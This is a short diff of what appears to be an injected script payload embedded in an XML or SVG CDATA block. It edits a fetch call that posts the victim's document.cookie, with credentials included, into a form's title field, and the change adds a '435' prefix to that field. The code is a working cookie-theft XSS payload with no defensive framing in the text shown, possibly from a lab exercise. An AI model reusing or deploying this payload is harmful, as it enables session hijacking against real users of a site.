@@ -8,7 +8,7 @@
               "Content-Type": "application/x-www-form-urlencoded",
             },
             credentials: "include",
-            body: "title=" + encodeURIComponent(document.cookie) + "&author=93&img=1&content=1"
+            body: "title=435" + encodeURIComponent(document.cookie) + "&author=93&img=1&content=1"
           });
       };
   ]]></script>
